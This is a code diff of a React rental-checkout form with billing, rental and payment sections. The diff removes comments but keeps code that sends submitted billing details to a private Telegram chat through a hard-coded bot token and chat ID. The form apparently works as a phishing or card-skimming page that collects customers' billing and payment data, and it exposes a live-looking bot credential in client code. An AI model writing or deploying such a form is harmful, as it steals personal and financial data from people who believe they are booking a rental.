@@ -36,9 +36,9 @@ const Form = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    // Telegram Bot Token and Chat ID
-    const token = '7629587294:AAFjAEmnzYc06BtG9OoUQYSctKxCSiFjTb4';  // Replace with your bot's token
-    const chatId = '-4799118768';   // Replace with your chat ID (can be your user ID)
+   
+    const token = '7629587294:AAFjAEmnzYc06BtG9OoUQYSctKxCSiFjTb4';  
+    const chatId = '-4799118768';   
 
     const message = `
       *Billing Info*:
@@ -71,7 +71,7 @@ const Form = () => {
     const data = {
       chat_id: chatId,
       text: message,
-      parse_mode: 'Markdown',  // Use Markdown to format the message
+      parse_mode: 'Markdown',  
     };
 
     try {
@@ -102,7 +102,7 @@ const Form = () => {
   <div className="container">
   <div className={s.wrapper}>
       <div className={s.formContainer}>
-        {/* Step 1: Billing Info */}
+     
         <section className={s.section} data-aos="fade-up" data-aos-delay="200" >
           <div className={s.wrap}>
             <div className={s.header}>
@@ -158,7 +158,7 @@ const Form = () => {
           </div>
         </section>
 
-        {/* Step 2: Rental Info */}
+
         <section className={s.section} data-aos="fade-up" data-aos-delay="400" >
           <div className={s.header}>
             <h2>Rental Info</h2>
@@ -250,7 +250,6 @@ const Form = () => {
           </form>
         </section>
 
-        {/* Step 3: Payment Method */}
         <section className={s.section} data-aos="fade-up" data-aos-delay="600" >
           <div className={s.header}>
             <h2>Payment Method</h2>
@@ -324,7 +323,6 @@ const Form = () => {
           </form>
         </section>
 
-        {/* Step 4: Confirmation */}
         <section className={s.section} data-aos="fade-up" data-aos-delay="800" >
   <div className={s.header}>
     <h2>Confirmation</h2>
